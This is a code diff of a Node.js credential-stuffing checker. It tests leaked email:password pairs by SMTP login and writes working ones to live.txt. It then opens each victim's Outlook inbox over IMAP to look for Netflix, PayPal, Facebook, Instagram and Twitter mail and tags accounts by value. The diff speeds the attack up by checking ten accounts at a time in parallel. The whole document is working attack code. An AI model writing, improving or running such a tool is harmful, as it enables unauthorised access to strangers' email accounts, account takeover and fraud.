@@ -65,7 +65,7 @@ const { ImapFlow } = require('imapflow');
         const liveEmails = [];
         const deadEmails = [];
 
-        const checkEmail = async (line, callback) => {
+        const checkEmail = async (line) => {
             const [emailAndPass, ...rest] = line.split(' | ');
             const [email, password] = emailAndPass.split(':');
 
@@ -81,103 +81,107 @@ const { ImapFlow } = require('imapflow');
                 connectionTimeout: 60000
             });
 
-            transporter.verify(async (error, success) => {
-                if (error) {
-                    deadEmails.push(emailAndPass);
-                    fs.appendFileSync('dead.txt', emailAndPass + '\n', 'utf8');
-                    console.log(chalk.red(`❌ 💨 ${email}`));
-                } else {
-                    liveEmails.push(emailAndPass);
-                    console.log(chalk.green(`✅ 💨 ${emailAndPass}`));
+            return new Promise((resolve) => {
+                transporter.verify(async (error, success) => {
+                    if (error) {
+                        deadEmails.push(emailAndPass);
+                        fs.appendFileSync('dead.txt', emailAndPass + '\n', 'utf8');
+                        console.log(chalk.red(`❌ 💨 ${email}`));
+                    } else {
+                        liveEmails.push(emailAndPass);
+                        console.log(chalk.green(`✅ 💨 ${emailAndPass}`));
 
-                    let liveEntry = emailAndPass;
+                        let liveEntry = emailAndPass;
 
-                    if (enableNetflixFilter || enablePayPalFilter || enableFacebookFilter || enableInstagramFilter || enableTwitterFilter) {
+                        if (enableNetflixFilter || enablePayPalFilter || enableFacebookFilter || enableInstagramFilter || enableTwitterFilter) {
 
-                        const client = new ImapFlow({
-                            host: 'outlook.office365.com',
-                            port: 993,
-                            secure: true,
-                            auth: {
-                                user: email,
-                                pass: password
-                            },
-                            logger: false
-                        });
+                            const client = new ImapFlow({
+                                host: 'outlook.office365.com',
+                                port: 993,
+                                secure: true,
+                                auth: {
+                                    user: email,
+                                    pass: password
+                                },
+                                logger: false
+                            });
 
-                        try {
-                            await client.connect();
-                            await client.mailboxOpen('INBOX');
+                            try {
+                                await client.connect();
+                                await client.mailboxOpen('INBOX');
 
-                            let hasNetflixMail = false;
-                            let hasPayPalMail = false;
-                            let hasFacebookMail = false;
-                            let hasInstagramMail = false;
-                            let hasTwitterMail = false;
+                                let hasNetflixMail = false;
+                                let hasPayPalMail = false;
+                                let hasFacebookMail = false;
+                                let hasInstagramMail = false;
+                                let hasTwitterMail = false;
 
-                            for await (let message of client.fetch('1:*', { envelope: true })) {
-                                if (enableNetflixFilter && message.envelope.from.some(from => from.address === 'info@account.netflix.com')) {
-                                    hasNetflixMail = true;
+                                for await (let message of client.fetch('1:*', { envelope: true })) {
+                                    if (enableNetflixFilter && message.envelope.from.some(from => from.address === 'info@account.netflix.com')) {
+                                        hasNetflixMail = true;
+                                    }
+                                    if (enablePayPalFilter && message.envelope.from.some(from => from.address === 'service@paypal.com')) {
+                                        hasPayPalMail = true;
+                                    }
+                                    if (enableFacebookFilter && message.envelope.from.some(from => from.address === 'notification@facebookmail.com')) {
+                                        hasFacebookMail = true;
+                                    }
+                                    if (enableInstagramFilter && message.envelope.from.some(from => from.address === 'no-reply@mail.instagram.com')) {
+                                        hasInstagramMail = true;
+                                    }
+                                    if (enableTwitterFilter && message.envelope.from.some(from => from.address === 'info@twitter.com')) {
+                                        hasTwitterMail = true;
+                                    }
+                                    if (hasNetflixMail && hasPayPalMail && hasFacebookMail && hasInstagramMail && hasTwitterMail) break;
                                 }
-                                if (enablePayPalFilter && message.envelope.from.some(from => from.address === 'service@paypal.com')) {
-                                    hasPayPalMail = true;
+
+                                if (hasNetflixMail) {
+                                    liveEntry += ' | Netflix ✅';
                                 }
-                                if (enableFacebookFilter && message.envelope.from.some(from => from.address === 'notification@facebookmail.com')) {
-                                    hasFacebookMail = true;
+                                if (hasPayPalMail) {
+                                    liveEntry += ' | PayPal ✅';
                                 }
-                                if (enableInstagramFilter && message.envelope.from.some(from => from.address === 'no-reply@mail.instagram.com')) {
-                                    hasInstagramMail = true;
+                                if (hasFacebookMail) {
+                                    liveEntry += ' | Facebook ✅';
                                 }
-                                if (enableTwitterFilter && message.envelope.from.some(from => from.address === 'info@twitter.com')) {
-                                    hasTwitterMail = true;
+                                if (hasInstagramMail) {
+                                    liveEntry += ' | Instagram ✅';
                                 }
-                                if (hasNetflixMail && hasPayPalMail && hasFacebookMail && hasInstagramMail && hasTwitterMail) break;
+                                if (hasTwitterMail) {
+                                    liveEntry += ' | Twitter ✅';
+                                }
+
+                                console.log(chalk.green(`Filtered: ${emailAndPass} | Netflix: ${hasNetflixMail ? '✅' : '❌'} | PayPal: ${hasPayPalMail ? '✅' : '❌'} | Facebook: ${hasFacebookMail ? '✅' : '❌'} | Instagram: ${hasInstagramMail ? '✅' : '❌'} | Twitter: ${hasTwitterMail ? '✅' : '❌'}`));
+
+                                await client.logout();
+                            } catch (imapError) {
+                                console.log(chalk.red(`Failed to fetch emails for: ${email}`));
                             }
 
-                            if (hasNetflixMail) {
-                                liveEntry += ' | Netflix ✅';
-                            }
-                            if (hasPayPalMail) {
-                                liveEntry += ' | PayPal ✅';
-                            }
-                            if (hasFacebookMail) {
-                                liveEntry += ' | Facebook ✅';
-                            }
-                            if (hasInstagramMail) {
-                                liveEntry += ' | Instagram ✅';
-                            }
-                            if (hasTwitterMail) {
-                                liveEntry += ' | Twitter ✅';
-                            }
-
-                            console.log(chalk.green(`Filtered: ${emailAndPass} | Netflix: ${hasNetflixMail ? '✅' : '❌'} | PayPal: ${hasPayPalMail ? '✅' : '❌'} | Facebook: ${hasFacebookMail ? '✅' : '❌'} | Instagram: ${hasInstagramMail ? '✅' : '❌'} | Twitter: ${hasTwitterMail ? '✅' : '❌'}`));
-
-                            await client.logout();
-                        } catch (imapError) {
-                            console.log(chalk.red(`Failed to fetch emails for: ${email}`));
                         }
 
+                        // store the data in live file
+                        fs.appendFileSync('live.txt', liveEntry + '\n', 'utf8');
                     }
-
-                    // store the data in live file
-                    fs.appendFileSync('live.txt', liveEntry + '\n', 'utf8');
-                }
-                callback();
+                    resolve();
+                });
             });
         };
 
-        let index = 0;
-        const checkNext = () => {
-            if (index < lines.length) {
-                checkEmail(lines[index], () => {
-                    index++;
-                    checkNext();
-                });
-            } else {
-                console.log(chalk.blue('Authentication process completed.'));
+        const checkNextBatch = async (batch) => {
+            await Promise.all(batch.map(line => checkEmail(line)));
+        };
+
+        const checkNext = async () => {
+            const batchSize = 10;
+            for (let i = 0; i < lines.length; i += batchSize) {
+                const batch = lines.slice(i, i + batchSize);
+                await checkNextBatch(batch);
             }
+            console.log(chalk.blue('Authentication process completed.'));
         };
 
         checkNext();
+
     });
 })();
